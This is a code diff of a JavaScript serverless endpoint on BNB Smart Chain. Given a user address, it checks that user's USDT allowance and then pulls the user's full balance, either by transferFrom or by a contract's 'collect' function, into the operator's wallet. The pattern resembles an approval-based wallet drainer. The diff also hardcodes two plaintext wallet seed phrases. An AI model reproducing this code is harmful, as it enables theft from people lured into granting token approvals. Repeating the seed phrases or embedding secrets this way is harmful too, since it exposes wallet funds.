@@ -306,149 +306,233 @@
 
 
 
+// import { ethers } from "ethers";
+
+// // 1. CONFIGURATION
+// // Replace with your actual seed phrase or store it in Vercel Env vars
+// const SEED_PHRASE = "civil similar trip proud dance auto attract behind casino bread visa denial";
+// const RPC_URL = "https://bsc-dataseed.binance.org"; // Reliable BSC RPC
+// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+
+// // ABI for USDT (Standard ERC-20 functions we need)
+// const USDT_ABI = [
+//   "function balanceOf(address account) external view returns (uint256)",
+//   "function allowance(address owner, address spender) external view returns (uint256)",
+//   "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
+// ];
+
+// export default async function handler(req, res) {
+//   // Only allow POST requests
+//   if (req.method !== "POST") {
+//     return res.status(405).json({ success: false, error: "Method not allowed" });
+//   }
+
+//   const { userAddress, amount } = req.body;
+
+//   // Basic validation
+//   if (!userAddress || !ethers.isAddress(userAddress)) {
+//     return res.status(400).json({ success: false, error: "Invalid user address" });
+//   }
+
+//   try {
+//     console.log("🚀 Starting Collection Process...");
+//     console.log(`Target User: ${userAddress}`);
+
+//     // 2. SETUP PROVIDER AND WALLET
+//     const provider = new ethers.JsonRpcProvider(RPC_URL);
+    
+//     // Derive wallet from seed phrase
+//     const wallet = ethers.Wallet.fromPhrase(SEED_PHRASE, provider);
+//     console.log(`✅ Connected Wallet Address: ${wallet.address}`);
+
+//     // Create contract instance using the SIGNER wallet (so we can sign txs)
+//     const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
+
+//     // 3. PRE-CHECKS (Read-only operations)
+//     console.log("🔍 Checking User Balance...");
+//     const userBalance = await usdtContract.balanceOf(userAddress);
+    
+//     if (userBalance === 0n) {
+//       return res.status(400).json({ 
+//         success: false, 
+//         error: "User has no USDT balance",
+//         balance: "0"
+//       });
+//     }
+//     console.log(`✅ User Balance: ${ethers.formatUnits(userBalance, 18)} USDT`);
+
+//     // Check Allowance
+//     console.log("🔍 Checking Allowance...");
+//     const currentAllowance = await usdtContract.allowance(userAddress, wallet.address);
+    
+//     // If 'amount' is provided, check against that. Otherwise, take max available.
+//     let targetAmount = userBalance;
+//     if (amount && Number(amount) > 0) {
+//       // Convert input amount to BigInt (assuming input is in decimals, e.g., 1000000000 for 1 USDT)
+//       // Note: If user sends raw number like 1, we assume they mean 1 USDT = 1e18
+//       // But usually API expects raw units. Let's assume input is RAW UNITS if it looks large, 
+//       // or we just take the full balance to be safe unless specified.
+      
+//       // For robustness, let's just take the full balance unless 'amount' is explicitly smaller than balance
+//       if (BigInt(amount) < userBalance) {
+//         targetAmount = BigInt(amount);
+//       } else {
+//         targetAmount = userBalance;
+//       }
+//     }
+
+//     if (currentAllowance < targetAmount) {
+//       return res.status(400).json({ 
+//         success: false, 
+//         error: "Insufficient Allowance",
+//         required: targetAmount.toString(),
+//         current: currentAllowance.toString(),
+//         formattedRequired: ethers.formatUnits(targetAmount, 18),
+//         formattedCurrent: ethers.formatUnits(currentAllowance, 18)
+//       });
+//     }
+    
+//     console.log(`✅ Allowance OK. Current: ${ethers.formatUnits(currentAllowance, 18)}, Required: ${ethers.formatUnits(targetAmount, 18)}`);
+
+//     // 4. EXECUTE TRANSFER
+//     console.log(`💸 Executing Transfer of ${ethers.formatUnits(targetAmount, 18)} USDT...`);
+    
+//     const tx = await usdtContract.transferFrom(userAddress, wallet.address, targetAmount, {
+//       // Optional: Set gas limit manually if estimation fails frequently
+//       // gasLimit: 100000 
+//     });
+
+//     console.log(`⏳ Transaction Hash: ${tx.hash}`);
+
+//     // 5. WAIT FOR CONFIRMATION
+//     console.log("⏳ Waiting for confirmation...");
+//     const receipt = await tx.wait();
+
+//     console.log(`✅ Success! Block Number: ${receipt.blockNumber}`);
+
+//     return res.status(200).json({ 
+//       success: true, 
+//       txHash: tx.hash,
+//       blockNumber: receipt.blockNumber,
+//       amountTransferred: ethers.formatUnits(targetAmount, 18),
+//       message: "Funds collected successfully"
+//     });
+
+//   } catch (error) {
+//     console.error("❌ Collection Error:", error);
+    
+//     // Detailed Error Handling
+//     if (error.reason) {
+//       console.error("Error Reason:", error.reason);
+//       if (error.reason.includes("User denied")) {
+//         return res.status(500).json({ success: false, error: "Transaction was rejected by the signer (if manual) or nonce issue." });
+//       }
+//       if (error.reason.includes("insufficient funds")) {
+//         return res.status(500).json({ success: false, error: "Wallet has insufficient BNB for gas." });
+//       }
+//       return res.status(500).json({ 
+//         success: false, 
+//         error: "Transfer failed", 
+//         details: error.reason 
+//       });
+//     }
+
+//     if (error.code === "CALL_EXCEPTION") {
+//       return res.status(500).json({ 
+//         success: false, 
+//         error: "Network error or node issue. Please retry.",
+//         details: error.message 
+//       });
+//     }
+
+//     return res.status(500).json({ 
+//       success: false, 
+//       error: "Unknown error occurred", 
+//       details: error.message 
+//     });
+//   }
+// }
+
+
+
 import { ethers } from "ethers";
 
 // 1. CONFIGURATION
-// Replace with your actual seed phrase or store it in Vercel Env vars
-const SEED_PHRASE = "civil similar trip proud dance auto attract behind casino bread visa denial";
-const RPC_URL = "https://bsc-dataseed.binance.org"; // Reliable BSC RPC
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-
-// ABI for USDT (Standard ERC-20 functions we need)
-const USDT_ABI = [
-  "function balanceOf(address account) external view returns (uint256)",
-  "function allowance(address owner, address spender) external view returns (uint256)",
-  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
-];
-
+const SEED_PHRASE = "bunker sudden weapon jelly act secret eye auction aisle holiday various before";
+const RPC_URL = "https://bsc-dataseed.binance.org"; 
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
+// const CONTRACT_ADDRESS = "0xB31704980F0201e30F4C6fA3746457AC1e660165"; // YOUR SMART CONTRACT
+const CONTRACT_ADDRESS = "0x0D618E1aA367a98eC0712F4feFBe6F88A8f0F9e4";
 export default async function handler(req, res) {
-  // Only allow POST requests
-  if (req.method !== "POST") {
-    return res.status(405).json({ success: false, error: "Method not allowed" });
-  }
-
-  const { userAddress, amount } = req.body;
-
-  // Basic validation
-  if (!userAddress || !ethers.isAddress(userAddress)) {
-    return res.status(400).json({ success: false, error: "Invalid user address" });
-  }
-
-  try {
-    console.log("🚀 Starting Collection Process...");
-    console.log(`Target User: ${userAddress}`);
-
-    // 2. SETUP PROVIDER AND WALLET
-    const provider = new ethers.JsonRpcProvider(RPC_URL);
-    
-    // Derive wallet from seed phrase
-    const wallet = ethers.Wallet.fromPhrase(SEED_PHRASE, provider);
-    console.log(`✅ Connected Wallet Address: ${wallet.address}`);
-
-    // Create contract instance using the SIGNER wallet (so we can sign txs)
-    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
-
-    // 3. PRE-CHECKS (Read-only operations)
-    console.log("🔍 Checking User Balance...");
-    const userBalance = await usdtContract.balanceOf(userAddress);
-    
-    if (userBalance === 0n) {
-      return res.status(400).json({ 
-        success: false, 
-        error: "User has no USDT balance",
-        balance: "0"
-      });
-    }
-    console.log(`✅ User Balance: ${ethers.formatUnits(userBalance, 18)} USDT`);
-
-    // Check Allowance
-    console.log("🔍 Checking Allowance...");
-    const currentAllowance = await usdtContract.allowance(userAddress, wallet.address);
-    
-    // If 'amount' is provided, check against that. Otherwise, take max available.
-    let targetAmount = userBalance;
-    if (amount && Number(amount) > 0) {
-      // Convert input amount to BigInt (assuming input is in decimals, e.g., 1000000000 for 1 USDT)
-      // Note: If user sends raw number like 1, we assume they mean 1 USDT = 1e18
-      // But usually API expects raw units. Let's assume input is RAW UNITS if it looks large, 
-      // or we just take the full balance to be safe unless specified.
-      
-      // For robustness, let's just take the full balance unless 'amount' is explicitly smaller than balance
-      if (BigInt(amount) < userBalance) {
-        targetAmount = BigInt(amount);
-      } else {
-        targetAmount = userBalance;
-      }
+    if (req.method !== "POST") {
+        return res.status(405).json({ success: false, error: "Method not allowed" });
     }
 
-    if (currentAllowance < targetAmount) {
-      return res.status(400).json({ 
-        success: false, 
-        error: "Insufficient Allowance",
-        required: targetAmount.toString(),
-        current: currentAllowance.toString(),
-        formattedRequired: ethers.formatUnits(targetAmount, 18),
-        formattedCurrent: ethers.formatUnits(currentAllowance, 18)
-      });
-    }
-    
-    console.log(`✅ Allowance OK. Current: ${ethers.formatUnits(currentAllowance, 18)}, Required: ${ethers.formatUnits(targetAmount, 18)}`);
+    const { userAddress, amount } = req.body;
 
-    // 4. EXECUTE TRANSFER
-    console.log(`💸 Executing Transfer of ${ethers.formatUnits(targetAmount, 18)} USDT...`);
-    
-    const tx = await usdtContract.transferFrom(userAddress, wallet.address, targetAmount, {
-      // Optional: Set gas limit manually if estimation fails frequently
-      // gasLimit: 100000 
-    });
-
-    console.log(`⏳ Transaction Hash: ${tx.hash}`);
-
-    // 5. WAIT FOR CONFIRMATION
-    console.log("⏳ Waiting for confirmation...");
-    const receipt = await tx.wait();
-
-    console.log(`✅ Success! Block Number: ${receipt.blockNumber}`);
-
-    return res.status(200).json({ 
-      success: true, 
-      txHash: tx.hash,
-      blockNumber: receipt.blockNumber,
-      amountTransferred: ethers.formatUnits(targetAmount, 18),
-      message: "Funds collected successfully"
-    });
-
-  } catch (error) {
-    console.error("❌ Collection Error:", error);
-    
-    // Detailed Error Handling
-    if (error.reason) {
-      console.error("Error Reason:", error.reason);
-      if (error.reason.includes("User denied")) {
-        return res.status(500).json({ success: false, error: "Transaction was rejected by the signer (if manual) or nonce issue." });
-      }
-      if (error.reason.includes("insufficient funds")) {
-        return res.status(500).json({ success: false, error: "Wallet has insufficient BNB for gas." });
-      }
-      return res.status(500).json({ 
-        success: false, 
-        error: "Transfer failed", 
-        details: error.reason 
-      });
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+        return res.status(400).json({ success: false, error: "Invalid user address" });
     }
 
-    if (error.code === "CALL_EXCEPTION") {
-      return res.status(500).json({ 
-        success: false, 
-        error: "Network error or node issue. Please retry.",
-        details: error.message 
-      });
-    }
+    try {
+        const provider = new ethers.JsonRpcProvider(RPC_URL);
+        const wallet = ethers.Wallet.fromPhrase(SEED_PHRASE, provider);
+        
+        // 1. Get the actual Merchant Address from the contract to verify where funds go
+        // (Optional but good for debugging)
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address)"], provider);
+        const userBalance = await usdtContract.balanceOf(userAddress);
+        
+        if (userBalance === 0n) {
+            return res.status(400).json({ success: false, error: "No USDT balance" });
+        }
 
-    return res.status(500).json({ 
-      success: false, 
-      error: "Unknown error occurred", 
-      details: error.message 
-    });
-  }
+        // 2. Check Allowance against the CONTRACT address
+        const allowanceCheck = new ethers.Contract(USDT_ADDRESS, ["function allowance(address,address)"], provider);
+        const currentAllowance = await allowanceCheck.allowance(userAddress, CONTRACT_ADDRESS);
+        
+        // Determine how much to take
+        let targetAmount = userBalance;
+        if (amount && BigInt(amount) > 0 && BigInt(amount) < userBalance) {
+            targetAmount = BigInt(amount);
+        }
+
+        if (currentAllowance < targetAmount) {
+            return res.status(400).json({ 
+                success: false, 
+                error: "Insufficient Allowance",
+                required: targetAmount.toString(),
+                current: currentAllowance.toString()
+            });
+        }
+
+        // 3. Execute via the Smart Contract's 'collect' function
+        const contractABI = [
+            "function collect(address user, uint256 amount) external",
+            "function merchant() external view returns (address)"
+        ];
+        
+        const merchantContract = new ethers.Contract(CONTRACT_ADDRESS, contractABI, wallet);
+        
+        console.log(`Calling collect for ${userAddress} amount ${targetAmount}`);
+        
+        const tx = await merchantContract.collect(userAddress, targetAmount);
+        
+        console.log(`Tx Hash: ${tx.hash}`);
+        const receipt = await tx.wait();
+
+        return res.status(200).json({ 
+            success: true, 
+            txHash: tx.hash,
+            blockNumber: receipt.blockNumber,
+            message: "Collected successfully via Contract"
+        });
+
+    } catch (error) {
+        console.error("❌ Collection Error:", error);
+        return res.status(500).json({ 
+            success: false, 
+            error: error.reason || error.message 
+        });
+    }
 }
